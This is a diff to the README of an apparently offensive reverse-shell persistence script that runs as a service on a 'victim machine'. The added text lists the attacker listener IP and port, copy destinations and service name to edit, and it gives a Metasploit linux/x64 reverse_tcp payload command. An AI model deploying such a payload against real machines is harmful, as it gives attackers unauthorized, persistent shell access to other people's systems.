@@ -10,7 +10,13 @@ This script is a payload that it supposed to run on the victim machine.
 
 The shell retains the user that creates this file on the victim machine.
 
-I tried with basic netcat but the connection is not stable because the shell being created is from a service. To run properly use the following Metasploit module/commands:
+### Required changes to the script:
+
+- The *ip* and *port* of the attacker listener
+- The *destinations* and *filename* for the copies
+- The *service_name* of the unit
+
+I tried with basic netcat to recieve the connection, but it is not stable because the shell being created is from a service. To run properly use the following Metasploit module/commands:
 
 ```
 msf6> use payload/linux/x64/shell/reverse_tcp
